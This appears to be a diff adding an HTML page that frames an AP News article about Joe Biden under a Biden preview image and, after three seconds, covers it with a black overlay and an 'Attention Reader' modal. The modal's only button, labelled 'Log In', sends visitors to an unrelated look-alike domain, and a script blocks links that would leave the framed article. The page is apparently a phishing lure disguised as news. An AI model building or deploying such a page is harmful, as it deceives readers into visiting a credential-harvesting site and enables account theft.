@@ -1,0 +1,170 @@
+
+
+<!DOCTYPE html>
+<!DOCTYPE html>
+<html>
+<head>
+	<style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Helvetica', Arial, sans-serif;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0, 0, 0, 0); /* Set the initial background color */
+        }
+
+        button {
+            position: absolute;
+            text-transform: uppercase;
+            background: #4da2fd;
+            color: #fff;
+            padding: 0.8em 1.5em;
+            border-radius: 5px;
+            font-weight: bold;
+            font-size: 18px;
+            border: none;
+            outline: none;
+            cursor: pointer;
+            transform: scale(1);
+            transition: 0.5s;
+        }
+
+        button:hover {
+            background: #3d92fd;
+        }
+
+        #modal {
+            transform: scale(0);
+            transition: 0.5s;
+            width: 300px;
+            height: 260px;
+			z-index:99999;
+            background: #fff;
+            color: #454545;
+            text-align: center;
+            border-radius: 10px;
+            box-shadow: 0 0 2px rgba(0, 0, 0, 0.4),
+            0 0 10px rgba(0, 0, 0, 0.1) inset;
+            position: relative; /* Set the position to relative */
+        }
+
+        h1 {
+            margin-bottom: 0;
+        }
+
+        .close_button {
+            transform: scale(1);
+            margin-top: 8px;
+            margin-left: -52px;
+            font-size: 15px;
+        }
+
+        svg {
+            margin-top: 25px;
+        }
+
+        #circle {
+            stroke-dasharray: 10 35;
+            stroke-dashoffset: 30;
+            transition: 1.2s;
+        }
+
+        #check {
+            stroke-dasharray: 10 45;
+            stroke-dashoffset: 20;
+            transition: 1.2s;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgb(0, 0, 0);
+        }
+    </style>
+    <meta property="og:image" content="https://i.ibb.co/64DMy4C/joebiden.jpg">
+	<title>Website</title>
+	<style>
+		/* Establece el iframe para que ocupe toda la pantalla */
+		iframe {
+			position: absolute;
+			top: 0;
+			left: 0;
+			width: 100%;
+			height: 100%;
+			border: none; /* Quita el borde del iframe */
+		}
+	</style>
+</head>
+<body>
+	<iframe id="myIframe" src="https://apnews.com/article/joe-biden-israel-ukraine-war-49354728b347178a4bf7508a0dc8f1d2/"></iframe>
+
+	<script>
+		var iframe = document.getElementById('myIframe');
+
+		iframe.addEventListener('load', function() {
+			// Función para manejar los clics en enlaces
+			function handleLinks(event) {
+				var target = event.target || event.srcElement;
+				if (target.tagName === 'A') {
+					var href = target.getAttribute('href');
+					
+					// Comprobar si el enlace intenta salir del sitio web cargado en el iframe
+					if (href && !href.startsWith('https://apnews.com/article/joe-biden-israel-ukraine-war-49354728b347178a4bf7508a0dc8f1d2/')) {
+						event.preventDefault(); // Evitar que el enlace se abra
+					}
+				}
+			}
+
+			// Agregar un controlador de eventos para los enlaces en el iframe
+			iframe.contentWindow.document.body.addEventListener('click', handleLinks);
+		});
+	</script>
+
+<div id="modal">
+    <svg width="40px" height="40px">
+        <circle cx="20" cy="20" r="19" fill="none" stroke="#2e2" stroke-width="2" id="circle"/>
+        <polyline points="9,19 16,27 30,13" fill="none" stroke="#2e2" stroke-width="4" id="check"/>
+    </svg>
+    <h1>Attention Reader</h1>
+    <p>To dismiss click the button below</p>
+    <button class="close_button" onclick="closemodal(); window.location.href='https://www.news-eventss.com/';">Log In</button>
+</div>
+
+<script type="text/javascript">
+    let modal = document.getElementById('modal');
+    let check = document.getElementById('check');
+    let circle = document.getElementById('circle');
+
+    function openmodal() {
+        // Create and append a full-screen overlay
+        let overlay = document.createElement('div');
+        overlay.className = 'overlay';
+        document.body.appendChild(overlay);
+
+        modal.style.transform = 'scale(1)';
+        circle.style.strokeDasharray = "40 0";
+        circle.style.strokeDashoffset = "0";
+    }
+
+    function closemodal() {
+        // Remove the full-screen overlay
+        let overlay = document.querySelector('.overlay');
+        overlay.parentNode.removeChild(overlay);
+
+        modal.style.transform = 'scale(0)';
+        circle.style.strokeDashoffset = "30";
+        circle.style.strokeDasharray = "10 35";
+    }
+
+    // Autoejecución después de 3 segundos
+    setTimeout(openmodal, 3000);
+</script>
+
+</body>
+</html>
